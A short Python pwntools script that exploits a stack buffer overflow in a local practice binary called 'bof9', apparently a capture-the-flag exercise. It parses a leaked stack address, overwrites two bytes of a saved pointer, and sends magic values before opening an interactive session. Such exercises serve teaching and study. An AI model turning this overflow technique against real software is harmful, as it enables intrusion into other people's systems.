#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./bof9')
p = process(exe.path)

#input()

p.recvuntil(b'user: ')
stack_leak = int(p.recvline(), 16)
log.info("stack leak: " + hex(stack_leak))

leak_buffer = stack_leak - 48
two_byte = leak_buffer & 0xFFFF
log.info("two_byte: " + hex(two_byte))

payload = b'b'*32 + p16(two_byte)
p.sendafter(b': ', payload)

payload = p64(0x13371337) + p64(0xDEADBEEF) + p64(0xCAFEBABE) + b'a'*(32-8*3)
p.sendafter(b': ', payload)

p.interactive()
